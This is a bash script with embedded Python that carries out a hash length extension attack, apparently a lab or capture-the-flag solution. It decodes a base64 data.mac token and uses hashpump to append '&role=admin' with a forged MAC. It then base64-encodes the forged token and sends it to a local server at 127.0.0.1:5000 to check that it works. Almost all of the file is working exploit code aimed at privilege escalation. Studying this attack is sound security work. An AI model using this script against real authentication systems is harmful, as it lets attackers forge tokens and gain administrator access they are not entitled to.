#!/bin/bash
# Hash Length Extension Attack - Python-backed robust version

if [ "$#" -lt 2 ]; then
  echo "Usage: $0 <token_b64> <key_len_guess> [extra_data]"
  echo "Example: $0 \"\$TOKEN\" 21"
  exit 1
fi

TOKEN="$1"
KEYLEN="$2"
EXTRA="${3:-&role=admin}"

# We use python to handle binary data safely. 
# Bash variables often truncate on null bytes (\x00), which hashpump produces in abundance.
python3 -c "
import sys
import base64
import subprocess
import urllib.parse

def main():
    token_b64 = sys.argv[1]
    key_len = int(sys.argv[2])
    extra_data = sys.argv[3]

    print(f'[+] Analyzing Token: {token_b64[:20]}...')
    
    # 1. Decode generic token format: base64( data + '.' + mac )
    # Note: Pad just in case
    token_b64 += '=' * ((4 - len(token_b64) % 4) % 4)
    try:
        raw = base64.b64decode(token_b64)
    except Exception as e:
        print(f'[!] Error decoding base64: {e}')
        sys.exit(1)

    if b'.' not in raw:
        print('[!] Invalid token format (no dot found)')
        sys.exit(1)

    # Split from right to handle dots in data
    data_bytes, mac_bytes = raw.rsplit(b'.', 1)
    
    original_mac = mac_bytes.decode('utf-8', errors='ignore')
    # Key concept: hashpump needs 'data' to calculate padding correctly.
    # It treats data as raw bytes.
    original_data = data_bytes.decode('latin-1')

    print(f'[+] Original MAC:  {original_mac}')
    print(f'[+] Original Data: {original_data!r}')
    print(f'[+] Extension:     {extra_data}')
    print(f'[+] Key Length:    {key_len}')

    # 2. Call hashpump
    # hashpump -s <mac> -d <data> -a <append> -k <keylen>
    # Output format is non-standard, parsing stdout is tricky because of raw binary dump.
    # It's safer to use subprocess and capture output strictly.
    
    cmd = [
        'hashpump',
        '-s', original_mac,
        '-d', original_data,
        '-a', extra_data,
        '-k', str(key_len)
    ]
    
    try:
        # We process stderr to avoid pollution, but hashpump prints result to stdout raw
        # Hashpump output: <new_hash><new_data>... unseparated effectively?
        # Actually hashpump outputs: <hash>\n<data>
        # BUT <data> contains binary padding.
        result = subprocess.run(cmd, capture_output=True, check=True)
    except subprocess.CalledProcessError as e:
        print('[!] Hashpump execution failed')
        print(e.stderr.decode())
        sys.exit(1)

    import codecs

    output_str = result.stdout.decode('utf-8')
    # Hashpump output: <hash><newline><data_escaped>
    # sometimes <hash><data_escaped> if no newline? Usually there is a newline.
    
    # Robust splitting: First 64 chars are the hash
    new_mac = output_str[:64]
    remaining = output_str[64:]
    
    # Strip leading newline if present
    if remaining.startswith('\n'):
        remaining = remaining[1:]
        
    # The remaining string contains standard C-style escapes (e.g. \x80)
    # We need to unescape this to get the actual raw bytes.
    # 'unicode_escape' does exactly this regarding \xNN sequences.
    try:
        new_data_str = codecs.decode(remaining, 'unicode_escape')
        new_data_bytes = new_data_str.encode('latin-1')
    except Exception as e:
        print(f'[!] Error processing hashpump output: {e}')
        # Fallback (risky but might help debug)
        new_data_bytes = remaining.encode('latin-1')

    # Remove trailing newline from the data itself if hashpump added one at very end
    # (Though logic above usually handles the separation newline, hashpump might add one at end of data too)
    if new_data_bytes.endswith(b'\n'):
         new_data_bytes = new_data_bytes[:-1]

    print(f'[+] New MAC:       {new_mac}')
    print(f'[+] New Data:      {new_data_bytes!r}')

    # 3. Construct Forged Token
    # format: base64( new_data + '.' + new_mac )
    
    payload = new_data_bytes + b'.' + new_mac.encode()
    forged_token = base64.b64encode(payload).decode()

    print('-' * 40)
    print(f'[SUCCESS] Forged Token:\\n{forged_token}')
    print('-' * 40)

    # 4. (Optional) Auto-verification
    import json
    import urllib.request
    
    url = 'http://127.0.0.1:5000/resource'
    req_data = json.dumps({'token': forged_token}).encode('utf-8')
    req = urllib.request.Request(url, data=req_data, headers={'Content-Type': 'application/json'})
    
    print('[+] Testing against server...')
    try:
        with urllib.request.urlopen(req) as f:
            resp = json.load(f)
            print(json.dumps(resp, indent=2))
    except urllib.error.HTTPError as e:
        print(f'[!] Server rejected token: {e.code}')
        print(e.read().decode())

main()
" "$TOKEN" "$KEYLEN" "$EXTRA"
